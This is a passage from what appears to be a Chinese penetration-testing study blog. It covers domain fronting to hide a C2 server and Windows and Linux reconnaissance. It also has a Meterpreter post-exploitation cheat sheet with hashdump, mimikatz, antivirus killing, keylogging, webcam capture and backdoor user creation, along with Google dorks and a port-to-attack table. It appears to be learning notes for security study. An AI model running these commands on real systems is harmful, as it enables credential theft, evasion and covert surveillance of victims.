<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">黄金：利用过程需要访问域控，而白银不用</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h4><p><a href="https://ares-x.com/2020/03/17/域渗透学习（二）Kerberos协议/#认证流程中需要关注的点，票据伪造的原理" target="_blank" rel="noopener">域渗透学习（二）Kerberos 协议 | AresX’s Blog (ares-x.com)</a></p>
<p><a href="https://apt404.github.io/2016/08/11/ntlm-kerberos/" target="_blank" rel="noopener">深刻理解 windows 安全认证机制 [ntlm &amp; Kerberos] | APT404 - 不作恶</a></p>
<h3 id="NTML与Kerberors总结"><a href="#NTML与Kerberors总结" class="headerlink" title="NTML与Kerberors总结"></a>NTML与Kerberors总结</h3><p><a href="https://www.vsdiffer.com/ntlm-vs-kerberos.html" target="_blank" rel="noopener">区别</a></p>
<hr>
<h2 id="域前置"><a href="#域前置" class="headerlink" title="域前置"></a>域前置</h2><p>Domain Fronting</p>
<p>域前置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">域前置（Domain fronting）</span><br><span class="line">是一种隐藏连接真实端点来规避互联网审查的技术。在应用层上运作时，域前置使用户能通过 HTTPS 连接到被屏蔽的服务（关键点），而表面上像	是在与另一个完全不同的站点通信。</span><br></pre></td></tr></table></figure>
<p>Domain Fronting 的核心技术是 CDN，所以我们先来了解下 CDN 的工作机制。说到CDN就想到NSLOOKUP命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NSLOOKUP</span><br><span class="line">可以指定查询的类型，可以查到 DNS 记录的生存时间还可以指定使用哪个 DNS 服务器进行解析。 在已安装 TCP&#x2F;IP 协议的电脑上面均可以使用这个命令。 主要用来诊断域名系统 (DNS) 基础结构的信息</span><br></pre></td></tr></table></figure>
<p>CDN是来加速网站的，但当同一个cdn下有两个网站，那么当我访问这两个域名时，实际上访问的都是1.1.1.1这个cdn，那么它是如何辨别我的目标域名的呢？  是我浏览器的请求包Host头中填入我们要访问的域名，也就是说，我们可以直接如下图也可也达到想要的效果；</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl cdn地址 -H “Host:域名” -v</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/02/23/reloNLfbs3xyu2Z.png" alt="image-20220223201812931"></p>
<p>看图可以知道，要是将我们的teamserver伪装成高信誉域名，那不就可以规避一下审查了吗？</p>
<p>所以域前置的原理是，<strong>在Host头中，一般设置为高信誉的域名，达到规避互联网审查的目的</strong></p>
<p>另外，我们也可以知道，因为 CDN 的存在，我们访问网站时访问的实际上只是 CDN，而不是直接和网站的真实服务器进行通信，所以利用 CDN 的同时也可以隐藏我们真实 C2 服务器的 IP。</p>
<p><strong>C2</strong> 就是 command&amp;control server，命令控制 <strong>服务器</strong>：<img src="https://s2.loli.net/2022/02/11/XwUAj1lsP6mTGiM.png" alt="image-20220211002720094"></p>
<p>一些云服务器的特性：<code>但由于某云有一个有趣的特点：当 CDN 配置中的源 IP 为自己云的服务器时，加速时会跳过对域名的检验，直接与配置中的域名绑定的源服务器 IP 进行通信。利用该特性，我们不需要真正去申请 CDN 时所填写的域名中配置解析相应的 CNAME 了。换言之，只要我们的 C2 服务器属于该云的服务器，那么我们就无需申请域名，只需要在申请 CDN 时随便填一个没有人绑定过的域名就好了，而且这个域名我们可以填成任何高信誉的域名，例如 test.microsoft.com或oops.microsoft.com…</code>:总结，拿自己的云服务器的ip去填申请cdn的源ip就可以不用为云服务器申请域名</p>
<p>其实我还是不是很懂，域前置攻击是怎么样的一个样子，我没有尝试，我是这样认为，域前置就是通过cdn隐藏自己的c2服务器ip，即使在受控端查看程序流量，也只是发现是程序在与高信誉网站通信，emm好像这就是了吧，关键的还是要想办法伪装自己的C2服务器，不然直接被发现了，但是听我黄哥说，cs的流量特征太明显，还是很容易被扫出，最近买了小迪的课，去看看他的免杀，很期待</p>
<h3 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41874930&#x2F;article&#x2F;details&#x2F;107742843</span><br><span class="line">https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1785562?ivk_sa&#x3D;1024320u</span><br><span class="line">https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;243146</span><br></pre></td></tr></table></figure>
<h2 id="Windows（域工作组）-信息收集"><a href="#Windows（域工作组）-信息收集" class="headerlink" title="Windows（域工作组） 信息收集"></a>Windows（域工作组） 信息收集</h2><p>主机搜集内容，十分重要喔</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">操作系统、权限、内网IP地址段、杀软、端口、服务、补丁情况、网络环境情况、共享、会话等如果是域内主机，那么操作系统、应用软件、补丁、服务、杀软等。</span><br></pre></td></tr></table></figure>
<p>域是什么？参考第一章节<code>内网中常见的名词解释</code></p>
<p>emm好像在我的红日篇也有写，这里我再整理一下</p>
<p>命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">windows下</span><br><span class="line">查看当前用户（whoami &#x2F;user）</span><br><span class="line">查看当前用户权限 (whoami &#x2F;priv)</span><br><span class="line">查看系统信息（systeminfo）</span><br><span class="line">查看网络连接状态（netstat -ano）</span><br><span class="line">机器名（hostname）</span><br><span class="line">当前操作系统(wmic OS get Caption,CSDVersion,OSArchitecture,Version)</span><br><span class="line">查杀软(WMIC &#x2F;Node:localhost &#x2F;Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName &#x2F;Format:list</span><br><span class="line">)</span><br><span class="line">查看已安装程序(wmic product get name,version)</span><br><span class="line">查看网络配置（ipconfig &#x2F;all）</span><br><span class="line">查看进程（tasklist &#x2F;v）</span><br><span class="line">查看当前登录域(net config workstation )</span><br><span class="line">查看某个本机用户的具体信息（net user *username*）</span><br><span class="line">获取域用户信息</span><br><span class="line">net user &#x2F;domain 显示所在域的用户名单</span><br><span class="line">net user 域用户&#x2F;domain 获取某个域用户的详细信息</span><br><span class="line">net user &#x2F;domain xxx 1231312 修改域用户的密码，需要域管理员权限</span><br><span class="line">net group 组名 &#x2F;domain   # 查看域中某工作组</span><br><span class="line">net group &#x2F;domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">kali下</span><br><span class="line">sysinfo             #查看目标主机系统信息</span><br><span class="line">run scraper         #查看目标主机详细信息</span><br><span class="line">run hashdump        #导出密码的哈希</span><br><span class="line">load kiwi           #加载mimikatz</span><br><span class="line">ps                  #查看目标主机进程信息</span><br><span class="line">pwd                 #查看目标当前目录(windows)</span><br><span class="line">getlwd              #查看目标当前目录(Linux)</span><br><span class="line">search -f *.jsp -d e:                #搜索E盘中所有以.jsp为后缀的文件</span><br><span class="line">download  e:	est.txt  &#x2F;root          #将目标机的e:	est.txt文件下载到&#x2F;root目录下</span><br><span class="line">upload    &#x2F;root&#x2F;test.txt d:	est      #将&#x2F;root&#x2F;test.txt上传到目标机的 d:	est 目录下</span><br><span class="line">getpid              #查看当前Meterpreter Shell的进程PID</span><br><span class="line">migrate 1384        #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br><span class="line">idletime            #查看主机运行时间</span><br><span class="line">getuid              #查看获取的当前权限</span><br><span class="line">getsystem           #提权</span><br><span class="line">run killav&#x2F;run post&#x2F;windows&#x2F;manage&#x2F;killav         #关闭杀毒软件</span><br><span class="line">screenshot          #截图</span><br><span class="line">webcam_list         #查看目标主机的摄像头</span><br><span class="line">webcam_snap         #拍照</span><br><span class="line">webcam_stream       #开视频</span><br><span class="line">execute  参数  -f 可执行文件   #执行可执行程序</span><br><span class="line">run getgui -u hack -p 123    #创建hack用户，密码为123</span><br><span class="line">run getgui -e                #开启远程桌面</span><br><span class="line">keyscan_start                #开启键盘记录功能</span><br><span class="line">keyscan_dump                 #显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop                 #停止键盘记录功能</span><br><span class="line">uictl  disable  keyboard     #禁止目标使用键盘</span><br><span class="line">uictl  enable   keyboard     #允许目标使用键盘</span><br><span class="line">uictl  disable  mouse        #禁止目标使用鼠标</span><br><span class="line">uictl  enable   mouse        #允许目标使用鼠标</span><br><span class="line">load                         #使用扩展库</span><br><span class="line">run                     #使用扩展库</span><br><span class="line"></span><br><span class="line">uictl [enable&#x2F;disable] [keyboard&#x2F;mouse&#x2F;all]  #开启或禁止键盘&#x2F;鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br><span class="line"></span><br><span class="line">POST后渗透模块</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;migrate           #自动进程迁移</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;checkvm           #查看目标主机是否运行在虚拟机上</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;killav            #关闭杀毒软件</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp        #开启远程桌面服务</span><br><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;autoroute         #查看路由信息</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users    #列举当前登录的用户</span><br><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_applications       #列举应用程序</span><br><span class="line">run windows&#x2F;gather&#x2F;credentials&#x2F;windows_autologin #抓取自动登录的用户名和密码</span><br><span class="line">run windows&#x2F;gather&#x2F;smart_hashdump               #dump出所有用户的hash</span><br><span class="line">参考：http:&#x2F;&#x2F;t.zoukankan.com&#x2F;qi-yuan-p-13782842.html</span><br></pre></td></tr></table></figure>
<h3 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;21r000&#x2F;p&#x2F;15612307.html</span><br><span class="line">https:&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;236</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;sycamorelg&#x2F;article&#x2F;details&#x2F;118727901https:&#x2F;&#x2F;m.freebuf.com&#x2F;articles&#x2F;network&#x2F;318148.html</span><br><span class="line">https:&#x2F;&#x2F;m.freebuf.com&#x2F;articles&#x2F;network&#x2F;318148.html</span><br></pre></td></tr></table></figure>
<h2 id="windows信息搜集思路以及工具"><a href="#windows信息搜集思路以及工具" class="headerlink" title="windows信息搜集思路以及工具"></a>windows信息搜集思路以及工具</h2><h3 id="信息搜集是什么？"><a href="#信息搜集是什么？" class="headerlink" title="信息搜集是什么？"></a>信息搜集是什么？</h3><p>信息搜集简单来说就是利用一些手段或者工具，搜集目标的信息。比如 IP 信息，端口信息，DNS 信息甚至是目标的组织架构，有些目标虽然看似不起眼，但是对渗透是否成功起到关键作用。<strong>渗透测试上信息搜集分为两类：主动信息搜集和被动信息搜集。</strong></p>
<ul>
<li>被动信息搜集：<code>IP地址段 、域名信息 、邮件地址 、文档图片数据 、公司地址 、公司组织架构 、联系电话 / 传真号码 、人员姓名 / 职务 、目标系统使用的技术架构 、公开的商业信息</code>,是<strong>不与目标直接交互</strong> , 通过公开渠道可获得的可用的信息。</li>
</ul>
<h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">网站 ：源码  robots文件   后台登录</span><br><span class="line">服务器 ：IP地址  服务器操作系统类型和版本   端口开放情况</span><br><span class="line">管理员 ：个人信息  手机号  社交账号  常用密码  敏感数字</span><br><span class="line">社工</span><br></pre></td></tr></table></figure>
<h3 id="网站操作类型识别"><a href="#网站操作类型识别" class="headerlink" title="网站操作类型识别"></a>网站操作类型识别</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">windows ：不区分大小写</span><br><span class="line">Linux ：区分大小写</span><br><span class="line">这个我倒是知道，但是容易忘，间接等于不知道</span><br></pre></td></tr></table></figure>
<h3 id="网站指纹识别工具"><a href="#网站指纹识别工具" class="headerlink" title="网站指纹识别工具"></a>网站指纹识别工具</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这个我的edge收藏夹就有很多，但是都是很零碎，顶多按照顺序分类了一些</span><br><span class="line">-御剑指纹识别（这个emm，还是用wappalyzer插件好，还要导入特征文件，烦┗|｀O′|┛ 嗷~~）</span><br><span class="line">-云悉在线指纹识别（这个我忘了要不要邀请码）</span><br><span class="line">-kali——whatweb</span><br><span class="line">-浏览器插件——Wappalyzer（这个很棒喔，省的我去f12中刷新网页了哈哈）</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2022/02/23/wznFb4sPd8AvOfk.png" alt="image-20220223232222333"></p>
<h3 id="目录扫描-敏感文件扫描"><a href="#目录扫描-敏感文件扫描" class="headerlink" title="目录扫描 / 敏感文件扫描"></a>目录扫描 / 敏感文件扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">这个有个7kbscan，号称扫天扫地的存在，感觉emm一言难尽，还得看计算机性能，凡是要我自己找特征文件的扫描器不是好的扫描器</span><br><span class="line">搜索网站目录下面的敏感文件 间接识别网站使用的框架或者内容管理系统</span><br><span class="line">工具  ：</span><br><span class="line">御剑指纹识别</span><br><span class="line">谷歌黑客语法</span><br><span class="line">	site:检索与指定网站有联系的所有已收录的网页(打完整万维网的格式)</span><br><span class="line">	inurl:检索含有指定内容的URL。</span><br><span class="line">	intext:限制搜索的页面中必须存在的内容</span><br><span class="line">	intitle:检索含有指定标题内容的网页</span><br><span class="line">	filetype：限制搜索的文件类型</span><br><span class="line">	link:&quot;&quot;可以得到一个所有包含了某个指定 URL 的页面列表</span><br><span class="line">其实这个语法我还是不是很会用哈哈</span><br><span class="line"></span><br><span class="line">查找后台地址：site: 域名 inurl:login|admin|manage|member|admin_login|login_admin|system|login|user|main|cms</span><br><span class="line">查找文本内容：site: 域名 intext: 管理 | 后台 | 登陆 | 用户名 | 密码 | 验证码 | 系统 | 帐号 | admin|login|sys|managetem|password|username</span><br><span class="line">查找可注入点：site: 域名 inurl:aspx|jsp|php|asp</span><br><span class="line">查找上传漏洞：site: 域名 inurl:file|load|editor|Files</span><br><span class="line">找 eweb 编辑器：site: 域名 inurl:ewebeditor|editor|uploadfile|eweb|edit</span><br><span class="line">存在的数据库：site: 域名 filetype:mdb|asp|#</span><br><span class="line">查看脚本类型：site: 域名 filetype:asp&#x2F;aspx&#x2F;php&#x2F;jsp</span><br><span class="line">迂回策略入侵：inurl:cms&#x2F;data&#x2F;templates&#x2F;images&#x2F;index&#x2F;</span><br><span class="line"></span><br><span class="line">作者：傻傻笨笨宝宝</span><br><span class="line">链接：https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;83b2fdf71e4c</span><br><span class="line">来源：简书</span><br></pre></td></tr></table></figure>
<h3 id="IP-查询"><a href="#IP-查询" class="headerlink" title="IP 查询"></a>IP 查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">找真正的ip，可以命令：ping nslookup使用全国ping，去规避cdn</span><br><span class="line">工具：站长之家 ip138</span><br></pre></td></tr></table></figure>
<h3 id="whois-查询"><a href="#whois-查询" class="headerlink" title="whois 查询"></a>whois 查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">站长工具</span><br><span class="line">ip138</span><br><span class="line">中国万网</span><br><span class="line">爱站网</span><br></pre></td></tr></table></figure>
<h3 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">7kbscan：web路径暴力探测工具</span><br><span class="line">查询方式：枚举(暴力破解) </span><br><span class="line">工具：子域名挖掘机</span><br></pre></td></tr></table></figure>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap</span><br><span class="line">御剑端口扫描</span><br><span class="line">shell命令、python脚本</span><br></pre></td></tr></table></figure>
<h3 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a><strong>常见端口</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;bmjoker&#x2F;p&#x2F;8833316.html</span><br></pre></td></tr></table></figure>
<div class="table-container">
<table>
<thead>
<tr>
<th>21</th>
<th>ftp/tftp/vsftpd 文件传输协议</th>
<th>爆破 / 嗅探 / 溢出 / 后门</th>
</tr>
</thead>
<tbody>
<tr>
<td>22</td>
<td>ssh 远程连接</td>
<td>爆破 /openssh 漏洞</td>
</tr>
<tr>
<td>23</td>
<td>Telnet 远程连接</td>
<td>爆破 / 嗅探 / 弱口令</td>
</tr>
<tr>
<td>25</td>
<td>SMTP 邮件服务</td>
<td>邮件伪造</td>
</tr>
<tr>
<td>53</td>
<td>DNS 域名解析系统</td>
<td>域传送 / 劫持 / 缓存投毒 / 欺骗</td>
</tr>
<tr>
<td>67/68</td>
<td>dhcp 服务</td>
<td>劫持 / 欺骗</td>
</tr>
<tr>
<td>110</td>
<td>pop3</td>
<td>爆破 / 嗅探</td>
</tr>
<tr>
<td>139</td>
<td>Samba 服务</td>
<td>爆破 / 未授权访问 / 远程命令执行</td>
</tr>
<tr>
<td>143</td>
<td>Imap 协议</td>
<td>爆破</td>
</tr>
<tr>
<td>161</td>
<td>SNMP 协议</td>
<td>爆破 / 搜集目标内网信息</td>
</tr>
<tr>
<td>389</td>
<td>Ldap 目录访问协议</td>
<td>注入 / 未授权访问 / 弱口令</td>
</tr>
<tr>
<td>445</td>
<td>smb</td>
<td>ms17-010 / 端口溢出</td>
</tr>
<tr>
<td>512/513/514</td>
<td>Linux Rexec 服务</td>
<td>爆破 / Rlogin 登陆</td>
</tr>
<tr>
<td>873</td>
<td>Rsync 服务</td>
<td>文件上传 / 未授权访问</td>
</tr>
<tr>
<td>1080</td>
<td>socket</td>
<td>爆破</td>
</tr>
<tr>
<td>1352</td>
<td>Lotus domino 邮件服务</td>
<td>爆破 / 信息泄漏</td>
</tr>
<tr>
<td>1433</td>
<td>mssql</td>
<td>爆破 / 注入 / SA 弱口令</td>
</tr>
<tr>
<td>1521</td>
<td>oracle</td>
<td>爆破 / 注入 / TNS 爆破 / 反弹 shell</td>
</tr>
<tr>
<td>2049</td>
<td>Nfs 服务</td>
<td>配置不当</td>
</tr>
<tr>
<td>2181</td>
<td>zookeeper 服务</td>
<td>未授权访问</td>
</tr>
<tr>
<td>2375</td>
<td>docker remote api</td>
<td>未授权访问</td>
</tr>
<tr>
<td>3306</td>
<td>mysql</td>
<td>爆破 / 注入</td>
</tr>
<tr>
<td>3389</td>
<td>Rdp 远程桌面链接</td>
<td>爆破 /shift 后门</td>
</tr>
<tr>
<td>4848</td>
<td>GlassFish 控制台</td>
<td>爆破 / 认证绕过</td>
</tr>
<tr>
<td>5000</td>
<td>sybase/DB2 数据库</td>
<td>爆破 / 注入 / 提权</td>
</tr>
<tr>
<td>5432</td>
<td>postgresql</td>
<td>爆破 / 注入 / 缓冲区溢出</td>
</tr>
<tr>
<td>5632</td>
<td>pcanywhere 服务</td>
<td>抓密码 / 代码执行</td>
</tr>
<tr>
<td>5900</td>
<td>vnc</td>
<td>爆破 / 认证绕过</td>
</tr>
<tr>
<td>6379</td>
<td>Redis 数据库</td>
<td>未授权访问 / 爆破</td>
</tr>
<tr>
<td>7001/7002</td>
<td>weblogic</td>
<td>java 反序列化 / 控制台弱口令</td>
</tr>
<tr>
<td>80/443</td>
<td>http/https</td>
<td>web 应用漏洞 / 心脏滴血</td>
</tr>
<tr>
<td>8069</td>
<td>zabbix 服务</td>
<td>远程命令执行 / 注入</td>
</tr>
<tr>
<td>8161</td>
<td>activemq</td>
<td>弱口令 / 写文件</td>
</tr>
<tr>
<td>8080/8089</td>
<td>Jboss/Tomcat/Resin</td>
<td>爆破 / PUT 文件上传 / 反序列化</td>
</tr>
<tr>
<td>8083/8086</td>
<td>influxDB</td>
<td>未授权访问</td>
</tr>
<tr>
<td>9000</td>
<td>fastcgi</td>
<td>远程命令执行</td>
</tr>
<tr>
<td>9090</td>
<td>Websphere 控制台</td>
<td>爆破 /java 反序列化 / 弱口令</td>
</tr>
<tr>
<td>9200/9300</td>
<td>elasticsearch</td>
<td>远程代码执行</td>
</tr>
<tr>
<td>11211</td>
<td>memcached</td>
<td>未授权访问</td>
</tr>
<tr>
<td>27017/27018</td>
<td>mongodb</td>
<td>未授权访问 / 爆破</td>
</tr>
</tbody>
</table>
</div>
<h3 id="针对dns的搜集"><a href="#针对dns的搜集" class="headerlink" title="针对dns的搜集"></a>针对dns的搜集</h3><h4 id="NSLOOKUP"><a href="#NSLOOKUP" class="headerlink" title="NSLOOKUP"></a>NSLOOKUP</h4><p>nslookup 命令几乎在所有的 PC 操作系统上都有安装，用于查询 DNS 的记录，查看域名解析是否正常，在网络故障的时候用来诊断网络问题。信息安全人员，可以通过返回的信息进行信息搜集。</p>
<h4 id="DIG"><a href="#DIG" class="headerlink" title="DIG"></a>DIG</h4><p>Dig 也是对 DNS 信息进行搜集的工具，dig 相比 nsllooup 不光功能更丰富，首先通过默认的上连 DNS 服务器去查询对应的 IP 地址，然后再以设置的 dnsserver 为上连 DNS 服务器。</p>
<h3 id="Linux信息搜集"><a href="#Linux信息搜集" class="headerlink" title="Linux信息搜集"></a>Linux信息搜集</h3><h3 id="获取内核，操作系统和设备信息"><a href="#获取内核，操作系统和设备信息" class="headerlink" title="获取内核，操作系统和设备信息"></a>获取内核，操作系统和设备信息</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">uname -a</td>
<td style="text-align:left">打印所有可用的系统信息</td>
</tr>
<tr>
<td style="text-align:left">uname -r</td>
<td style="text-align:left">内核版本信息</td>
</tr>
<tr>
<td style="text-align:left">uname -n</td>
<td style="text-align:left">系统主机名字</td>
</tr>
<tr>
<td style="text-align:left">hostname</td>
<td style="text-align:left">主机名</td>
</tr>
<tr>
<td style="text-align:left">uname -m</td>
<td style="text-align:left">Linux 内核架构（x86/x64）</td>
</tr>
<tr>
<td style="text-align:left">cat /proc/version</td>
<td style="text-align:left">内核信息</td>
</tr>
<tr>
<td style="text-align:left">cat /etc/*-release</td>
<td style="text-align:left">发布信息</td>
</tr>
<tr>
<td style="text-align:left">cat /etc/issue</td>
<td style="text-align:left">发布信息</td>
</tr>
<tr>
<td style="text-align:left">cat /proc/cpuinfo</td>
<td style="text-align:left">CPU 信息</td>
</tr>
<tr>
<td style="text-align:left">df -a</td>
<td style="text-align:left">文件系统信息</td>
</tr>
</tbody>
</table>
</div>
<h3 id="用户和组"><a href="#用户和组" class="headerlink" title="用户和组"></a>用户和组</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">cat /etc/passwd</td>
<td style="text-align:left">列出系统所有用户</td>
</tr>
<tr>
<td style="text-align:left">cat /etc/group</td>
<td style="text-align:left">列出系统所有组</td>
</tr>
<tr>
<td style="text-align:left">cat /etc/shadow</td>
<td style="text-align:left">列出所有用户 hash（需要 root 权限）</td>
</tr>
<tr>
<td style="text-align:left">finger、finger user</td>
<td style="text-align:left">当前登录的用户、查询用户的基本信息</td>
</tr>
<tr>
<td style="text-align:left">users</td>
<td style="text-align:left">当前登录的用户</td>
</tr>
<tr>
<td style="text-align:left">who -a</td>
<td style="text-align:left">当前登录的用户</td>
</tr>
<tr>
<td style="text-align:left">w</td>
<td style="text-align:left">显示目前登入系统的用户有那些人，以及他们正在执行的程序</td>
</tr>
<tr>
<td style="text-align:left">last</td>
<td style="text-align:left">显示登入过的用户信息</td>
</tr>
<tr>
<td style="text-align:left">lastlog</td>
<td style="text-align:left">显示系统中所有用户最近一次登录信息</td>
</tr>
<tr>
<td style="text-align:left">lastlog –u %username%</td>
<td style="text-align:left">显示指定用户最后一次登入信息</td>
</tr>
</tbody>
</table>
</div>
<h3 id="用户和权限信息"><a href="#用户和权限信息" class="headerlink" title="用户和权限信息"></a>用户和权限信息</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">whoami</td>
<td style="text-align:left">当前用户</td>
</tr>
<tr>
<td style="text-align:left">id</td>
<td style="text-align:left">当前用户信息</td>
</tr>
<tr>
<td style="text-align:left">cat /etc/sudoers</td>
<td style="text-align:left">可以使用 sudo 提升到 root 的用户（需要 root 权限）</td>
</tr>
<tr>
<td style="text-align:left">sudo</td>
<td style="text-align:left">允许普通用户执行一些或者全部的 root 命令的一个工具</td>
</tr>
<tr>
<td style="text-align:left">sudo -l</td>
<td style="text-align:left">列出目前用户可执行与无法执行的指令</td>
</tr>
<tr>
<td style="text-align:left">su</td>
<td style="text-align:left">切换当前用户身份到其他用户身份</td>
</tr>
</tbody>
</table>
</div>
<h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">命令</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">env</td>
<td style="text-align:left">打印系统环境信息</td>
</tr>
<tr>
<td style="text-align:left">set</td>
<td style="text-align:left">打印系统环境信息</td>
</tr>
<tr>
<td style="text-align:left">echo $PATH</td>
<td style="text-align:left">环境变量中的路径信息</td>
</tr>
<tr>
<td style="text-align:left">history</td>
<td style="text-align:left">打印历史命令</td>
</tr>
<tr>
<td style="text-align:left">pwd</td>
<td style="text-align:left">显示当前路径</td>
</tr>
<tr>
<td style="text-align:left">cat /etc/profile</td>
<td style="text-align:left">显示默认系统遍历</td>
</tr>
<tr>
<td style="text-align:left">cat /etc/shells</td>
<td style="text-align:left">显示可用的 shell</td>
</tr>
</tbody>
</table>
</div>
